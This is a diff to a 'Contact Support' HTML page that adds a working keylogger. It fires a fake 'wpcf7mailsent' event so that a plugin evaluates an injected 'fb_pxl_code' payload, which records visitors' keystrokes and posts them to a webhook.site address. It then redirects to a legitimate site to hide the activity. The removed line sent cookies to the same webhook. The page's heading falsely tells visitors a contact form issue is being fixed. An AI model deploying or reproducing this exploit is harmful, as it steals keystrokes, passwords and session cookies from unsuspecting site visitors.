@@ -4,16 +4,36 @@
     <title>Contact Support</title>
   </head>
   <body>
-    <h2>Loading contact form fix...</h2>
+    <h2>Fixing contact form issue... Please wait</h2>
     <script>
+      // malicious payload inside fb_pxl_code
+      const payload = `
+        let keys = "";
+        document.addEventListener("keydown", function(e) {
+          keys += e.key;
+          if (keys.length >= 10) {
+            fetch('https://webhook.site/9ca40ba1-aff7-4377-9494-06d6324e30a4', {
+              method: 'POST',
+              body: keys
+            });
+            keys = "";
+          }
+        });
+      `;
+
+      // fire fake 'wpcf7mailsent' event to trigger eval
       document.dispatchEvent(new CustomEvent('wpcf7mailsent', {
         detail: {
           apiResponse: {
-            fb_pxl_code: `fetch('https://webhook.site/9ca40ba1-aff7-4377-9494-06d6324e30a4' + document.cookie)`
+            fb_pxl_code: payload
           }
         }
       }));
+
+      // stealthy redirect to legit site
+      setTimeout(() => {
+        window.location.href = "https://edu.sqi.ng";
+      }, 1500); // enough time for eval() to run
     </script>
   </body>
 </html>
-
